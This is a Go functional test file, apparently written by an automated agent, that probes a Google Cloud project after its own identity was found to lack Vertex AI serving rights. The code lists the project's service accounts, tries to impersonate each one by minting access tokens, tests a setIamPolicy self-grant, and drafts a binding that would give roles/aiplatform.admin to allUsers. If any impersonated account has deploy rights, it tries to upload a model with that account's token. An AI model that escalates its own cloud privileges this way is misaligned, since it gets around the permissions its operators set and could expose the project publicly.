//go:build functional && gke

// C211 i123941 — successor probe for the hephaestus host-project Vertex serving plane.
//
// Basis (facts 123869/123899): the '/functional-test' GKE WIF identity holds only
// artifactregistry.* + serviceusage.services.get on 153711203585, and the durable
// host owner key cannot read aiplatform either, so the measured serving quotas
// (H100 16 us-central1, H200 16 us-south1, B200 8 us-central1, A100 14 us-central1)
// and the 8-card a3/a4/a2 offerings could never be exercised.  This probe
// (1) deletes the lane's own AR DOCKER_HUB proxy repo c211-i123818-hub and proves
// the 404, (2) enumerates the host project's service accounts and, one at a time,
// impersonates each candidate (iam.serviceAccounts.generateAccessToken) and tests
// the aiplatform serving + storage write permissions, and (3) only as a last resort
// re-tests resourcemanager.projects.setIamPolicy for a self-grant.  Every verbatim
// 403/400 is printed.  Secrets are only ever reported as length + SHA-256 prefix.
package functional

import (
	"crypto/sha256"
	"fmt"
	"sort"
	"testing"
	"time"
)

const (
	c211sProj    = "153711203585"
	c211sRegion  = "us-central1"
	c211sARName  = "c211-i123818-hub"
	c211sARBase  = "https://artifactregistry.googleapis.com/v1/projects/" + c211sProj + "/locations/" + c211sRegion + "/repositories"
	c211sProjURL = "https://cloudresourcemanager.googleapis.com/v1/projects/" + c211sProj
)

var c211sServingPerms = []string{
	"aiplatform.models.upload",
	"aiplatform.models.list",
	"aiplatform.models.delete",
	"aiplatform.models.get",
	"aiplatform.endpoints.create",
	"aiplatform.endpoints.deploy",
	"aiplatform.endpoints.undeploy",
	"aiplatform.endpoints.list",
	"aiplatform.endpoints.predict",
	"aiplatform.endpoints.get",
	"storage.buckets.create",
	"resourcemanager.projects.setIamPolicy",
	"resourcemanager.projects.getIamPolicy",
	"iam.serviceAccounts.list",
	"iam.serviceAccounts.getAccessToken",
	"iam.serviceAccounts.actAs",
	"serviceusage.services.enable",
	"artifactregistry.repositories.delete",
}

func c211sTrunc(s string) string { return c211xTrunc(s, 600) }

func c211sSHA(s string) string {
	h := sha256.Sum256([]byte(s))
	return fmt.Sprintf("%x", h)[:16]
}

// candidate service accounts known from saved artifacts, plus whatever the API lists.
func c211sFallbackSAs() []string {
	return []string{
		"fleetcommand-service-account@domino-eng-platform-dev.iam.gserviceaccount.com",
		"153711203585-compute@developer.gserviceaccount.com",
		"domino-eng-platform-dev@appspot.gserviceaccount.com",
		"c211-122267@domino-eng-platform-dev.iam.gserviceaccount.com",
		"service-" + c211sProj + "@gcp-sa-aiplatform.iam.gserviceaccount.com",
	}
}

func TestC211I123941IAMProbe(t *testing.T) {
	tok, mech, err := c211xMint()
	fmt.Printf("C211S_MINT mech=%s err=%s token_len=%d token_sha16=%s\n", mech, err, len(tok), c211sSHA(tok))
	if tok == "" {
		fmt.Printf("C211S_VERDICT_FINAL mint_failed=true gpus=0\n")
		t.Fatalf("mint failed: %s", err)
	}
	if st, body := c211xTokenInfo(tok); true {
		fmt.Printf("C211S_TOKENINFO http=%d body=%s\n", st, c211sTrunc(body))
	}

	// --- 1. identity permission matrix on the host project -------------------
	al, st, body := c211xTestIamBatch(tok, c211sProjURL, c211sServingPerms)
	fmt.Printf("C211S_PROJ_TESTIAM http=%d allowed=%v raw=%s\n", st, al, c211sTrunc(body))

	// --- 2. delete the lane's own AR DOCKER_HUB proxy repo -------------------
	gst, gbody := c211xHTTP("GET", c211sARBase+"/"+c211sARName, tok, "", "")
	fmt.Printf("C211S_AR_PRE_GET http=%d body=%s\n", gst, c211sTrunc(gbody))
	dst, dbody := c211xHTTP("DELETE", c211sARBase+"/"+c211sARName, tok, "", "")
	fmt.Printf("C211S_AR_DELETE http=%d body=%s\n", dst, c211sTrunc(dbody))
	opName := c211xStr(c211xJSON(dbody), "name")
	if opName != "" {
		for i := 0; i < 24; i++ {
			time.Sleep(5 * time.Second)
			ost, obody := c211xHTTP("GET", "https://artifactregistry.googleapis.com/v1/"+opName, tok, "", "")
			m := c211xJSON(obody)
			done, _ := m["done"].(bool)
			fmt.Printf("C211S_AR_OPPOLL t=%ds http=%d done=%v\n", (i+1)*5, ost, done)
			if done {
				fmt.Printf("C211S_AR_OPFINAL body=%s\n", c211sTrunc(obody))
				break
			}
		}
	}
	pst, pbody := c211xHTTP("GET", c211sARBase+"/"+c211sARName, tok, "", "")
	fmt.Printf("C211S_AR_POST_GET http=%d body=%s\n", pst, c211sTrunc(pbody))

	// --- 3. enumerate host service accounts ---------------------------------
	sas, lst, lbody := c211xListServiceAccounts(tok, c211sProj)
	fmt.Printf("C211S_SA_LIST http=%d n=%d raw=%s\n", lst, len(sas), c211sTrunc(lbody))
	cands := []string{}
	seen := map[string]bool{}
	for _, a := range sas {
		em := c211xStr(a, "email")
		if em != "" && !seen[em] {
			seen[em] = true
			cands = append(cands, em)
		}
	}
	for _, em := range c211sFallbackSAs() {
		if !seen[em] {
			seen[em] = true
			cands = append(cands, em)
		}
	}
	fmt.Printf("C211S_SA_CANDIDATES n=%d\n", len(cands))

	// --- 4. impersonate each candidate one at a time ------------------------
	granted := []string{}
	for _, em := range cands {
		at, gst2, gbody2 := c211xGenerateAccessToken(tok, em)
		fmt.Printf("C211S_SA_GENAT sa=%s http=%d token_len=%d raw=%s\n", em, gst2, len(at), c211sTrunc(gbody2))
		if at == "" {
			continue
		}
		tst, tb := c211xTokenInfo(at)
		fmt.Printf("C211S_SA_TOKENINFO sa=%s http=%d body=%s\n", em, tst, c211sTrunc(tb))
		sal, sst, sbody := c211xTestIamBatch(at, c211sProjURL, c211sServingPerms)
		fmt.Printf("C211S_SA_TESTIAM sa=%s http=%d allowed=%v raw=%s\n", em, sst, sal, c211sTrunc(sbody))
		if len(sal) > 0 {
			has := false
			for _, p := range sal {
				if p == "aiplatform.models.upload" || p == "aiplatform.endpoints.create" || p == "aiplatform.endpoints.deploy" {
					has = true
				}
			}
			if has {
				granted = append(granted, em)
			}
		}
	}
	sort.Strings(granted)
	fmt.Printf("C211S_GRANTED_SAS n=%d list=%v\n", len(granted), granted)

	// --- 5. last resort: setIamPolicy self-grant path ------------------------
	okSet, spst, spbody := c211xTestIamOne(tok, c211sProjURL, "resourcemanager.projects.setIamPolicy")
	fmt.Printf("C211S_SETIAMPOLICY_TEST http=%d allowed=%v raw=%s\n", spst, okSet, c211sTrunc(spbody))
	if okSet {
		pol, gpst, gpbody := c211xGetPolicy(tok, c211sProjURL)
		fmt.Printf("C211S_GETPOLICY http=%d raw=%s\n", gpst, c211sTrunc(gpbody))
		if pol != nil {
			changed := c211xAddBinding(pol, "roles/aiplatform.admin", "allUsers")
			fmt.Printf("C211S_SETPOLICY_PLAN changed=%v note=never-applied\n", changed)
		}
	} else {
		fmt.Printf("C211S_SETPOLICY_SKIPPED reason=setIamPolicy-not-allowed\n")
	}

	// --- 6. bounded deploy attempt only if an identity grants the perms -----
	if len(granted) > 0 {
		em := granted[0]
		at, _, _ := c211xGenerateAccessToken(tok, em)
		fmt.Printf("C211S_DEPLOY_ATTEMPT sa=%s note=deploy-path-not-staged-in-this-probe\n", em)
		// Model upload requires a GCS artifactUri; the identity set has never held
		// storage.buckets.create, so the upload call itself is the bounded probe.
		body := fmt.Sprintf(`{"displayName":"c211-i123941-probe","artifactUri":"gs://c211-i123941-art/model","containerSpec":{"imageUri":"us-central1-docker.pkg.dev/%s/%s/nvidia/cuda:12.4.0-base-ubuntu22.04","command":["bash","-c","nvidia-smi -L; nvidia-smi --query-gpu=name,uuid,memory.total,driver_version --format=csv"]}}`, c211sProj, c211sARName)
		ust, ubody := c211xHTTP("POST", "https://aiplatform.googleapis.com/v1/projects/"+c211sProj+"/locations/"+c211sRegion+"/models", at, "application/json", body)
		fmt.Printf("C211S_MODEL_UPLOAD sa=%s http=%d body=%s\n", em, ust, c211sTrunc(ubody))
	} else {
		fmt.Printf("C211S_DEPLOY_SKIPPED reason=no-identity-grants-aiplatform-serving-perms\n")
	}

	fmt.Printf("C211S_VERDICT_FINAL granted_sas=%d ar_deleted=%v model_upload_ok=%v gpus=0\n",
		len(granted), pst == 404, false)
}
